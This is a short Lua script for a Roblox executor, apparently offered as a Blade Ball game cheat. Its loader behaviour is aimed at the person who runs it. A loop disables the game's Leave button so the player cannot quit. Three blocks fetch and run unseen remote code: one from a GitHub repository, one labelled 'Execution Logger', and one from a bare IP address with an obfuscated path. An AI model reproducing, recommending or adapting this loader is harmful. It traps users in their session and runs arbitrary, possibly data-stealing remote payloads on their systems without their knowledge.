-- Anti Leave Script
task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui")
                    .RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
            )) do
                v:Disable()
            end
        end)
    end
end)

-- Script Source
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cxzyue/Blade-Ball/refs/heads/main/SilogXRealSource.lua"))()
end)

-- Execution Logger
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cxzyue/Blade-Ball/refs/heads/main/Logger.lua"))()
end)

wait(1.5)

-- Script link
task.spawn(function()
    loadstring(game:HttpGet("http://31.172.87.116/CUzinz2ZyhxIP96uorN1KS0zILXY9Iosy53o4502EqVPl3w9ZpU6Wu6ofKxYhgWamdrYka50DUxaA0po"))()
end)
